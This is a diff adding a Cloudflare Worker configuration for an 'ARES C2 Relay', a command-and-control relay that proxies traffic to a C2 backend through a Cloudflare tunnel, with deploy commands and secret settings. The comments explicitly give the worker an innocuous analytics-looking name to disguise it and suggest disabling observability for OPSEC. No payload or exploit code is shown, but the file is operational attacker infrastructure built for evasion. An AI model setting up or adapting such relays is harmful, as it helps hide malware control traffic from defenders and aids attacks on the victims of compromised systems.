@@ -1,0 +1,38 @@
+# ═══════════════════════════════════════════════════════════════
+#  ARES C2 Relay — Cloudflare Worker Config (v2.0)
+#
+#  Thay thế ngrok. Worker proxy traffic qua Cloudflare network.
+#
+#  Deploy:
+#    1. Set secrets:
+#       npx wrangler secret put C2_BACKEND
+#       npx wrangler secret put RELAY_KEY
+#    2. Deploy:
+#       npx wrangler deploy
+#    3. (Optional) Custom domain:
+#       npx wrangler domains add analytics-edge.your-domain.com
+#
+#  Dev:   npx wrangler dev
+#  Logs:  npx wrangler tail
+# ═══════════════════════════════════════════════════════════════
+
+# Worker name — innocuous, looks like analytics service
+name = "analytics-edge"
+main = "src/index.js"
+compatibility_date = "2024-01-01"
+
+# Environment variables (non-secret)
+[vars]
+ENVIRONMENT = "production"
+
+# NOTE: Secrets are set via CLI, NOT in this file:
+#   npx wrangler secret put C2_BACKEND
+#     → Enter value: https://<tunnel-id>.cfargotunnel.com
+#     → Or if custom domain: https://c2.your-domain.com
+#
+#   npx wrangler secret put RELAY_KEY
+#     → Enter value: <your-secret-relay-key>
+
+# Observability (optional — disable for OPSEC)
+# [observability]
+# enabled = false
